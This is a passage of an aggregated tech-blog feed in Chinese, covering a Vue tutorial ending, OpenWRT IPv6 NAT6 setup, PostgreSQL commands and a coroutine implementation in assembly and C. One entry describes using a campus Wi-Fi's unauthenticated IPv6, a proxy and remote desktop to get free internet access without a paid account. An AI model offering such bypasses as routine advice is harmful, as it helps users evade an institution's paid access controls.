        <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">result</span> <span class="o">=</span> <span class="nx">res</span><span class="p">})</span>
        <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">res</span><span class="p">)})</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p><del>具体实现代码里面很清楚了</del> 这个文件的作用就是请求 <code>http://httpbin.org/get</code> 并把结果显示在界面上</p>
<p><strong>注意前后端分离的项目会有<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">跨域(CORS)问题</a>，这个问题比较复杂，巨坑，网上也有较多解决的文章<del>咕咕咕</del></strong></p>
<h1 id="0x5-技巧及坑们">0x5 技巧及坑们</h1>
<p>这里介绍一些我写vue项目遇到的坑和使用的技巧</p>
<h2 id="data-methods-computed-props-的区别">data methods computed props 的区别</h2>
<p><del>TODO</del></p>
<p>vue中存储数据有几种方式——data、</p>
<h1 id="0x6-结语">0x6 结语</h1>
<p>到此，一个简单的vue项目就完成了，对于如何组织项目，前后端如何交互应该已经有了初步了解。本文也会持续更新，欢迎关注我的<a href="https://blog.creedowl.com/">blog</a></p>
<p>本文的实例请访问<a href="https://github.com/creedowl/vue_demo/">github</a></p>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/04/data-migration-between-microservices/</id>
        <title><![CDATA[微服务架构下的数据迁移指南]]></title>
        <updated>2019-04-09T07:50:37+08:00</updated>
        <link href="https://blog.stdioa.com/2019/04/data-migration-between-microservices/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/04/data-migration-between-microservices/"><![CDATA[<!-- build time:Wed Jun 19 2019 17:59:18 GMT+0800 (中国标准时间) --><p>在扇贝，除了 CRUD 以外，做的最多的事情大概也就是数据迁移了，以至于后来简单的数据迁移工作都变成了一种搬砖。今天动笔写一写在扇贝做数据迁移的方法，以及一些需要关注的点。</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/</id>
        <title><![CDATA[南航校园网OpenWRT配置IPv6 NAT6]]></title>
        <updated>2019-04-04T15:29:39+08:00</updated>
        <link href="https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/"><![CDATA[<blockquote>
<p>当前IPv6越来越流行，不但解决了IPv4地址不够用的问题，还能给接入的设备提供公网访问的支持。但由于校园网的特殊性，虽然很早就有了IPv6支持，大部分学校在IPv6地址分配上却有剧毒，无法向下游设备分配独立的IPv6地址（正常家庭网络环境中路由器及下游设备都能自动分配独立的公网IPv6地址），以南航为例，OpenWRT上虽然获取到了2001开头，/64结尾的公网IPv6地址，但下游设备却无IPv6访问权限。本文介绍南航校园网环境下如何在OpenWRT下获取IPv6并配置NAT6使下游设备拥有IPv6访问权限。</p>
</blockquote>
<h2 id="0软硬件需求">0：软硬件需求</h2>
<p><strong>硬件</strong>：支持OpenWRT固件的路由器或软路由（推荐使用软路由，性能更好，支持启用更多服务，且不需要考虑太多兼容性问题，x86版本OpenWRT一把梭）</p>
<p><strong>软件</strong>：较新版本的OpenWRT或其衍生版本（lede，pandorabox等，但原版OpenWRT最佳）</p>
<p><strong>OpenWRT内核需高于3.7</strong>， linux kernel在3.7版本开始支持NAT6</p>
<p><del>内核版本不够高且无法升级可以尝试早年由北邮大佬开发的NAT66项目，但不推荐</del></p>
<p>所需软件包：</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ip6tables kmod-ipt-nat6 kmod-ip6tables kmod-ip6tables-extra luci-proto-ipv6 iputils-traceroute6
</code></pre></div><p>较新版本已经自带IPv6支持，老版本需要自己安装相关软件包，但兼容性较差，或者内核版本不足，建议找较新版本或者自行编译。</p>
<h2 id="1openwrt配置获取ipv6">1：OpenWRT配置获取IPv6</h2>
<p><img src="http://ww1.sinaimg.cn/large/0071ouepgy1g1pisgc9yhj319v0p2tco.jpg" alt="IPv6_setting_1"></p>
<h3 id="1-修改ipv6-ula前缀为fd开头默认为dd开头">1. 修改IPv6 ULA前缀为fd开头（默认为dd开头）</h3>
<h3 id="2-修改wan6口配置如下图所示">2. 修改wan6口配置（如下图所示）</h3>
<p><img src="http://ww1.sinaimg.cn/large/0071ouepgy1g1pivtmkrbj30p00eumyi.jpg" alt="IPv6_setting_2"></p>
<h3 id="3-修改lan口dhcp服务器配置如下图所示">3. 修改lan口DHCP服务器配置（如下图所示）</h3>
<p><img src="http://ww1.sinaimg.cn/large/0071ouepgy1g1piynr74fj30ta0adwfe.jpg" alt="IPv6_setting_3"></p>
<p><img src="http://ww1.sinaimg.cn/large/0071ouepgy1g1pizho2fmj30nu0bymy5.jpg" alt="IPv6_setting_4"></p>
<p>此时稍等片刻，在概况中应该就能看到获取到的IPv6地址及下游设备DHCPv6分配内网IPv6地址</p>
<p><img src="http://ww1.sinaimg.cn/large/0071ouepgy1g1pj4uxq0hj30rd08xaar.jpg" alt="IPv6_setting_5"></p>
<p><img src="http://ww1.sinaimg.cn/large/0071ouepgy1g1pj5feonfj311806ldgn.jpg" alt="IPv6_setting_6"></p>
<p>现在你的路由器已经可以使用IPv6了，但下游设备并不行，就需要配置NAT6。</p>
<h2 id="2配置nat6">2：配置NAT6</h2>
<p>虽然NAT6并不符合IPv6的设计哲学，但却能解决一些问题，如安全隔离，或者像我们这样通过单一地址转发给多个设备使用。</p>
<h3 id="1-修改防火墙">1. 修改防火墙</h3>
<p><img src="http://ww1.sinaimg.cn/large/0071ouepgy1g1pjfj32f5j30su0gvn00.jpg" alt="IPv6_setting_7"></p>
<p>加入以下自定义规则</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nv">WAN6</span><span class="o">=</span>pppoe-wan
<span class="nv">LAN</span><span class="o">=</span>br-lan
ip6tables -t nat -A POSTROUTING -o <span class="nv">$WAN6</span> -j MASQUERADE
ip6tables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
ip6tables -A FORWARD -i <span class="nv">$LAN</span> -j ACCEPT
</code></pre></div><p><strong>注意这里WAN6和LAN要改为外网IPv6和内网网卡名字，在终端使用ifconfig查看</strong></p>
<p><img src="http://ww1.sinaimg.cn/large/0071ouepgy1g1pjk4cddbj30ll0jwq71.jpg" alt="IPv6_setting_8"></p>
<h3 id="2-配置网关">2. 配置网关</h3>
<p>在终端执行 <code>ip -6 r</code> 查看默认网关（default开头），如果是类似</p>
<p><code>default from 2001:xxxx:xxxx:xxxx::/64 via fe80::ded2:fcff:fe98:64f7 dev pppoe-wan proto static metric 512 pref medium</code></p>
<p>这样蛋疼的网关，需要去掉<code>from 2001:xxxx:xxxx:xxxx::/64</code> 这段再添加默认网关，例如</p>
<p><code>ip -6 route add default via fe80::ded2:fcff:fe98:64f7 dev pppoe-wan proto static metric 512</code></p>
<p>可以建立一个<code>/etc/hotplug.d/iface/99-ipv6</code>实现自动配置</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="cp">#!/bin/sh
</span><span class="cp"></span><span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$ACTION</span><span class="s2">&#34;</span> <span class="o">=</span> ifup <span class="o">]</span> <span class="o">||</span> <span class="nb">exit</span> <span class="m">0</span>
<span class="nv">iface</span><span class="o">=</span>wan6
<span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$iface</span><span class="s2">&#34;</span> -o <span class="s2">&#34;</span><span class="nv">$INTERFACE</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="nv">$iface</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="nb">exit</span> <span class="m">0</span>
ip -6 route add <span class="sb">`</span>ip -6 route show default<span class="p">|</span>sed -e <span class="s1">&#39;s/from [^ ]* //&#39;</span><span class="sb">`</span>
logger -t IPv6 <span class="s2">&#34;Add IPv6 default route.&#34;</span>
</code></pre></div><p>最后别忘了修改权限</p>
<p><code>chmod +x /etc/hotplug.d/iface/99-ipv6</code></p>
<p>重启路由器就可以愉快的玩耍了。</p>
<p><del>本来还想折腾IPv6端口转发，但一直无法配置成功。后来突然发现南航校园网下没有对IPv4做严格隔离（除了80端口基本上都能直接访问），就直接做IPv4端口转发配合DDNS，连接校园WIFI（nuaa.portal，<strong>付费版本</strong>）就可以直接使用，速度还挺快。。。就真香了。。不过配置IPv6端口转发还是有意义，比如可以从非校园网访问，校园网访问IPv6无需认证（不要充钱了），相关教程有空再补上（咕咕咕）有需求可以参考<a href="https://shura.eu.org/2018/12/06/ipv6-NAT%E5%90%8E%E9%85%8D%E7%BD%AE%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">ipv6 NAT后配置端口转发</a></del></p>
<h2 id="参考资料">参考资料</h2>
<blockquote>
<p><a href="https://github.com/tuna/ipv6.tsinghua.edu.cn/blob/master/openwrt.md">清华OpenWRT 路由器作为 IPv6 网关的配置</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/03/geektime-microservice-notes/</id>
        <title><![CDATA[《从 0 开始学微服务》阅读笔记]]></title>
        <updated>2019-03-30T11:58:25+08:00</updated>
        <link href="https://blog.stdioa.com/2019/03/geektime-microservice-notes/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/03/geektime-microservice-notes/"><![CDATA[<!-- build time:Wed Jun 19 2019 17:59:18 GMT+0800 (中国标准时间) --><p>前一阵子购买了胡忠想老师的《从 0 开始学微服务》极客时间专栏，二月份看完以后做了一些笔记。</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/postgres-handbook/</id>
        <title><![CDATA[PostgreSQL 简介与常用命令]]></title>
        <updated>2019-02-03T10:32:39+08:00</updated>
        <link href="https://blog.creedowl.com/posts/postgres-handbook/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/postgres-handbook/"><![CDATA[<h1 id="postgresql-简介与常用命令">PostgreSQL 简介与常用命令</h1>
<p>PostgreSQL，简称postgres，是继mysql被收购之后极为热门的开源关系型数据库，这篇文章简单记录一些使用过程中的基本用法。</p>
<h2 id="安装">安装</h2>
<p>为了保证宿主机环境的纯净，这里使用docker来安装postgres</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">docker run --name postgres -p 5432:5432 -e <span class="nv">POSTGRES_PASSWORD</span><span class="o">=</span>password -d postgres
</code></pre></div><p>常用环境变量</p>
<blockquote>
<p>POSTGRES_USER: 数据库用户，缺省postgres</p>
<p>POSTGRES_PASSWORD: 数据库密码 ps. 若从localhost连接则默认trust，不需要填写</p>
<p>POSTGRES_DB: 数据库名，缺省postgres</p>
</blockquote>
<p>更多docker相关内容参考<a href="https://hub.docker.com/_/postgres">postgres官方docker镜像页面</a></p>
<h2 id="常用命令">常用命令</h2>
<p><strong>连接数据库</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">psql -U user -d database -h host -p port
</code></pre></div><p><strong>导入数据</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">psql database &lt; db.sql
</code></pre></div><p><strong>控制台命令</strong></p>
<blockquote>
<p>\h：查看SQL命令的解释，比如\h select。</p>
<p>?：查看psql命令列表。</p>
<p>\l：列出所有数据库。</p>
<p>\c [database_name]：连接其他数据库。</p>
<p>\d：列出当前数据库的所有表格。</p>
<p>\d [table_name]：列出某一张表格的结构。</p>
<p>\du：列出所有用户。</p>
<p>\e：打开文本编辑器。</p>
<p>\conninfo：列出当前数据库和连接的信息。</p>
</blockquote>
<p><strong>数据库操作</strong></p>
<p><em>采用基本sql语法</em></p>
<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">#</span> <span class="err">建表</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="k">IF</span> <span class="k">NOT</span> <span class="k">EXISTS</span> <span class="k">user</span> <span class="p">(</span>
	<span class="n">id</span> <span class="nb">SERIAL</span> <span class="k">PRIMARY</span> <span class="k">KEY</span><span class="p">,</span>
    <span class="n">name</span> <span class="nb">TEXT</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">);</span>

<span class="o">#</span> <span class="err">插入</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="k">user</span> <span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">);</span>

<span class="o">#</span> <span class="err">选择</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span><span class="p">;</span>

<span class="o">#</span> <span class="err">更新</span>
<span class="k">UPDATE</span> <span class="k">user</span> <span class="k">SET</span> <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;qwer&#39;</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="o">#</span> <span class="err">删除</span>
<span class="k">DELETE</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="o">#</span> <span class="err">添加栏位</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">ADD</span> <span class="n">gender</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>

<span class="o">#</span> <span class="err">更新表结构</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">ALTER</span> <span class="k">COLUMN</span> <span class="n">gender</span> <span class="k">SET</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">;</span>

<span class="o">#</span> <span class="err">字段更名</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">RENAME</span> <span class="k">COLUMN</span> <span class="n">name</span> <span class="k">TO</span> <span class="n">username</span><span class="p">;</span>

<span class="o">#</span> <span class="err">删除字段</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">DROP</span> <span class="k">COLUMN</span> <span class="n">gender</span><span class="p">;</span>

<span class="o">#</span> <span class="err">表名更改</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">RENAME</span> <span class="k">TO</span> <span class="n">users</span><span class="p">;</span>

<span class="o">#</span> <span class="err">删除表格</span>
<span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">users</span><span class="p">;</span>
</code></pre></div><h2 id="相关链接">相关链接</h2>
<blockquote>
<p><a href="http://www.ruanyifeng.com/blog/2013/12/getting_started_with_postgresql.html">PostgreSQL新手入门</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/</id>
        <title><![CDATA[Linux内核gdb+qemu调试]]></title>
        <updated>2019-01-28T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/"/>
        <content type="text/html" src="https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/"><![CDATA[Linux内核gdb+qemu调试]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2019/01/13/Use-the-Internet-via-nuaa-portal-for-free/</id>
        <title><![CDATA[免费使用 nuaa.portal 上网]]></title>
        <updated>2019-01-13T15:01:16+08:00</updated>
        <link href="https://blog.vvzero.com/2019/01/13/Use-the-Internet-via-nuaa-portal-for-free/"/>
        <content type="text/html" src="https://blog.vvzero.com/2019/01/13/Use-the-Internet-via-nuaa-portal-for-free/"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>学校赐予我的 nuaa.portal 账号在一个月之前就到期了，这一个月内，虽然对我的生活没有太大的影响，但是还是感受到了某些不便（总觉得某些东西有了更好，没有却不能拉倒）。前些天跟创新区内的同学讨论了本校的ipv6部署情况，突然就有兴致来折腾一下。</p><p>没错，免费上网还是有可能的。</p><h2 id="前提概要"><a href="#前提概要" class="headerlink" title="前提概要"></a>前提概要</h2><ul><li>学校的 nuaa.portal 公共无线网，Windows 电脑只要连接上，就能获取一个 ipv4 内网地址和一个 ipv6 地址。如果没有在指定 Web 页面上认证，则无法使用 ipv4 连接互联网。但是可以通过 ipv6 联网。</li><li>学校默认不分配 ipv6 的 DNS 服务器。</li><li>学校教学办公区有线宽带，经直接拨号，同样可以获得一个 ipv4 内网地址和一个 ipv6 地址，均可以访问互联网。</li></ul><h2 id="一步步的尝试"><a href="#一步步的尝试" class="headerlink" title="一步步的尝试"></a>一步步的尝试</h2><h3 id="直接用-ipv6-上提供-ipv6-服务的网站"><a href="#直接用-ipv6-上提供-ipv6-服务的网站" class="headerlink" title="直接用 ipv6 上提供 ipv6 服务的网站"></a>直接用 ipv6 上提供 ipv6 服务的网站</h3><p>既然可以从 nuaa.portal 获取可以访问互联网的 ipv6 地址，那么最简单的思路，就是直接使用这条通道。但是，由于学校没有 ipv6 的 DNS（认证后，如果访问 ipv6 站点，其实仍然是使用 ipv4 的 DNS 服务器），故必须配置 ipv6 的 DNS。这一点很简单，直接修改 DNS 服务器即可：</p><p><img src="https://img.vvzero.com/Use-the-Internet-via-nuaa-portal-for-free_2.png" alt=""></p><p>这里推荐两个 ipv6 的 DNS 服务器，一个是 Google 家的，一个是清华大学 TUNA 协会的：</p><ul><li><code>2001:4860:4860::8888</code></li><li><code>2001:da8::666</code></li></ul><p>然后，实测就可以访问提供 ipv6 服务的网站啦！</p><p>比如：</p><ul><li>google.com.hk</li><li><a href="http://www.youtube.com" target="_blank" rel="noopener">www.youtube.com</a></li><li>ipv6.baidu.com</li><li>ipv6.mirrors.ustc.edu.cn</li></ul><h3 id="使用-ipv6-代理服务器进行无限制的互联网访问"><a href="#使用-ipv6-代理服务器进行无限制的互联网访问" class="headerlink" title="使用 ipv6 代理服务器进行无限制的互联网访问"></a>使用 ipv6 代理服务器进行无限制的互联网访问</h3><p>上一条方法虽然简单，但是只能访问提供 ipv6 的网站，然而现在国内乃至国际上大多数网站并没有提供 ipv6 服务，至少，你目前还不能登微信。</p><p>但是，如果有一个同时具有有 ipv6 和 ipv4 的代理服务器，不就一切都解决了吗？把本地的所有流量都通过 ipv6 转发至代理服务器，然后就可以访问任意站点了！</p><p>这里，我借用了 Shadowsocks，配置了一台有 ipv6 和 ipv4 的服务器，然后本地开启全局代理，实际就可以访问任意站点了。</p><p>使用这个方法，本地 DNS 甚至都不需要配置。</p><h3 id="终极（硬核）蹭网方案"><a href="#终极（硬核）蹭网方案" class="headerlink" title="终极（硬核）蹭网方案"></a>终极（硬核）蹭网方案</h3><p>还记得一开始我说过，教学办公区也能获得 ipv6 地址吗？</p><p>对，我就是想用远程桌面！</p><p><img src="https://img.vvzero.com/Use-the-Internet-via-nuaa-portal-for-free_1.jpg" alt=""></p><p>我在学校创新区日常开着一台机器，拨号联网，（性能还不错）。</p><p>emmm，其实这个方法真的很硬核很有效，而且，由于 nuaa.portal 和教学办公区实际属于同一个大的内网环境，学校的路由器还不错，实测 ping 延迟只有 2ms，完全满足了日常电脑使用（除了不能使用显卡玩游戏什么的）。微软家的远程桌面还是很强大的！</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>我其实还是想再来一年的免费 nuaa.portal 账号的。</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/coroutines-part-1-lightweight-threads-for-concurrency/</id>
        <title><![CDATA[Coroutines: Lightweight Threads for Concurrency]]></title>
        <updated>2019-01-12T16:00:00+08:00</updated>
        <link href="https://invariant.me/coroutines-part-1-lightweight-threads-for-concurrency/"/>
        <content type="text/html" src="https://invariant.me/coroutines-part-1-lightweight-threads-for-concurrency/"><![CDATA[<img src="https://images.unsplash.com/photo-1501820434261-5bb046afcf6b?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=2000&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Coroutines: Lightweight Threads for Concurrency"><p><strong>Outdated:</strong> This post was written in January, 2019 and is not currently maintained.</p><!--kg-card-begin: html--><hr><!--kg-card-end: html--><p>In concurrent applications, we need a way to allow different tasks to make progress at the “same” time, which is known as concurrency. The most widely-used technology for concurrency is threads, the minimal execution unit provided by the operating system. However, there is a non-negligible overhead associated with multi-threading, especially when the threads are only performing small, lightweight tasks.</p><p>Multithreading overhead comes from how threads are implemented in operating systems. In Linux, a thread is just a "lightweight" process that shares resources, like virtual memory, with its parent process. When a thread yields control and begins to wait on an event to wake up, the operating system will take over control, find the next suitable process to run, and switch to that process, just like what it would do with normal processes. This introduces a significant overhead for many kinds of multithread applications, especially those requiring frequent message passing between threads. Additionally, when a thread is created or destroyed, the operating system has to initialize or destroy the thread control block (TCB, <code>task_struct</code> in Linux), which is a non-trivial operation.</p><p>Coroutine is a mechanism for reducing multithreading overheads. As a userspace equivalent of threads, coroutines are managed entirely in userspace and is opaque to the underlying OS.</p><h2 id="stackless-coroutines">Stackless Coroutines</h2><p>There are two types of coroutine systems, stackless and stackful. A stackless coroutine system is usually implemented with some kind of language-level transformations, like the CPS (Continuation Passing Style) transformation. A program in CPS form, as its name suggests, instead of passing the results of computations by return values, passes them by “continuations”, which looks like:</p><pre><code>// Original form
let a = f1()
let b = f2(a)
print(b)

// CPS form
f1(
    a =&gt; f2(
        a,
        b =&gt; print(b)
    )
)
</code></pre><p>The code above looks like the ancient JavaScript callback pattern, doesn't it? JavaScript is by design single threaded and asynchronous, and blocking operations have to be implemented with callbacks. In fact, this kind of callbacks is an explicit form of CPS, regardless of whether <code>Promise</code> is used to avoid problems like <a href="https://en.wiktionary.org/wiki/callback_hell">callback hell</a>. To simplify programming, <code>async/await</code> syntax is introduced later, which enables users to write code that looks synchronous but is in fact asynchronous, and is usually implemented with automatic CPS transformation.</p><p>Another approach to stackless coroutine is to make use of a big <code>switch</code> loop:</p><pre><code>// Original form
int f1(int a) {
    int i, v = 0;
    for(i = 0; i &lt; a; i++) v += i;
    return v;
}

// Stackless coroutine
struct Local {
    int i;
    int v;
};
int f1(int a, int state, struct Local *local, int *out) {
    switch(state) {
        case 0:
            local-&gt;i = 0;
            local-&gt;v = 0;
            return 1;
        case 1:
            if(local-&gt;i &lt; a) {
                local-&gt;v += local-&gt;i;
                local-&gt;i++;
                return 1;
            } else {
                *out = local-&gt;v;
                return -1;
            }
    }
}
</code></pre><p>In the code above, we maintain the execution state of <code>f1</code> outside of itself, therefore allowing recovery of its execution at any point of time as long as we preserve <code>state</code> and <code>local</code>.</p><h2 id="stackful-coroutines">Stackful Coroutines</h2><p>Stackless coroutines are “stackless” because they do not explicitly preserve the call stack, while stackful coroutine systems allocate a new call stack for each coroutine. Compared to stackless coroutines, stackful coroutines usually do not need language-level transformations, making it easier to be integrated into different programming languages.</p><p>When the OS switches tasks, it needs to save the machine state of the old task and load the new task’s one. A machine state contains all used registers, along with in-memory data that should be preserved, e.g. the call stack. As we are going to do coroutine switching in userspace, we have to manually implement the logic for switching machine states.</p><p>For convenience, in this section, we assume that our platform is Linux on a x86_64 machine and we are implementing cooperative scheduling. Therefore, we need to follow the x86_64 System V ABI when dealing with calling conventions. The ABI specifies that the registers <code>rbx</code>, <code>rbp</code>, <code>r12</code>, <code>r13</code>, <code>r14</code> and <code>r15</code> are callee saved, so they must be saved before switching to another coroutine.</p><p>Let’s start from the coroutine switching function:</p><pre><code>asm(
    "_co_switch:\n"
    "push %rbx\n"
    "push %rbp\n"
    "push %r12\n"
    "push %r13\n"
    "push %r14\n"
    "push %r15\n"
    "mov (%rdi), %rax\n"
    "mov %rsp, (%rdi)\n"
    "mov %rax, %rsp\n"
    "pop %r15\n"
    "pop %r14\n"
    "pop %r13\n"
    "pop %r12\n"
    "pop %rbp\n"
    "pop %rbx\n"
    "ret\n"
);
</code></pre><p>The <code>co_switch</code> function pushes all current callee-saved registers onto the current stack, swaps <code>(%rdi)</code> (the memory pointed to by the first argument, target stack address here) with the stack pointer <code>%rsp</code>, loads the callee-saved registers of the target coroutine, and then executes <code>ret</code> to return in the target coroutine.</p><p>Suppose we have a coroutine <code>A</code> that has just executed the instruction <code>mov %rax, %rsp</code>. At this point, we are sure that the old stack, which is swapped out into memory location <code>(%rdi)</code>, has the following layout (from lower address to higher address):</p><pre><code>[r15] [r14] [r13] [r12] [rbp] [rbx] [return_address]
</code></pre><p>A coroutine can only be switched out with <code>co_switch</code>, so its stack must have the same layout. Therefore, since we are already on the target stack after executing <code>mov %rax, %rsp</code>, we can pop the saved registers in the reverse order, from <code>r15</code> to <code>rbx</code>. Then, the <code>ret</code> instruction is executed, which pops the return address and jumps to it, and the caller code on the target coroutine observes a normal return from <code>co_switch</code>.</p><p>However, we just assumed that we already have a coroutine switched out previously, and some other logic is required for starting a new coroutine.</p><p>We have to construct the stack layout:</p><pre><code>[r15] [r14] [r13] [r12] [rbp] [rbx] [return_address]
</code></pre><p>The values of the saved registers can be arbitrary, since there’s no old registers to save. To construct a valid “return” address, a trampoline is needed:</p><pre><code>asm(
    "_pre_call_entry:\n"
    "pop %rax\n" // entry
    "pop %rdi\n" // userdata
    "call *%rax\n"
    "ud2\n"
);
</code></pre><p><code>pre_call_entry</code> pops a function pointer <code>entry</code> and the associated <code>userdata</code> from the stack, calls <code>entry</code> with <code>userdata</code> as its only argument, then executes <code>ud2</code> to indicate <code>entry</code> should never return. Therefore, we need to include <code>entry</code> and <code>userdata</code> in our stack construction:</p><pre><code>[r15] [r14] [r13] [r12] [rbp] [rbx] [return_address] [entry] [userdata]
</code></pre><p>With the two assembly functions and the expected stack layout, now we can write the code to start a coroutine:</p><pre><code>void co_switch(void **stack);
void pre_call_entry();

struct Coroutine;

typedef void (*CoEntry)(struct Coroutine *co);

struct Coroutine {
    void *stack;
    CoEntry entry;
    int terminated;
};

void call_entry(struct Coroutine *co) {
    co_switch(&amp;co-&gt;stack);
    co-&gt;entry(co);
    co-&gt;terminated = 1;
    co_switch(&amp;co-&gt;stack);
}

void start_coroutine(struct Coroutine *co) {
    void **stack = (void **) co-&gt;stack;

    *(--stack) = co;
    *(--stack) = call_entry; // 16-byte aligned

    *(--stack) = pre_call_entry;

    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;

    co-&gt;stack = (void *) stack;

    co_switch(&amp;co-&gt;stack);
}
</code></pre><p>The full example code is available on my <a href="https://gist.github.com/losfair/60af3f0c565470e305b6c021ce57e3dc">GitHub Gist</a>.</p><h1 id="optimizations-and-tricks">Optimizations and Tricks</h1><ul><li><code>ret</code> in <code>co_switch</code> can be replaced by an explicit <code>pop</code> and <code>jmp</code> to avoid <a href="https://stackoverflow.com/questions/22442766/return-address-prediction-stack-buffer-vs-stack-stored-return-address">return address prediction failures</a>.</li><li>If your coroutines are extremely lightweight and usually use a very small space on the stack, we can use a fixed memory region as the execution stack (“shared stack”) and copy in/out the used range (<code>stack_end - sp</code>) of the coroutine stack when switching in/out of a coroutine. Although memory copying is needed, this approach can save a lot of memory while still allowing to use guard pages to ensure safety.</li><li>To implement cross-platform stackful coroutines without writing assembly, the <code>pthread_*</code> functions can be used along with <code>setjmp</code> and <code>longjmp</code> to initialize the machine state on a new stack and switch between stacks, without actually using OS threads.</li></ul>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/</id>
        <title><![CDATA[智能合约攻击面及ctf出题指南]]></title>
        <updated>2019-01-03T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/"/>
        <content type="text/html" src="https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/"><![CDATA[智能合约攻击面及ctf出题指南]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2018/12/03/channy-s-summer-holiday-reading/</id>
        <title><![CDATA[长令记事：暑期读书分享]]></title>
        <updated>2018-12-03T12:15:08+08:00</updated>
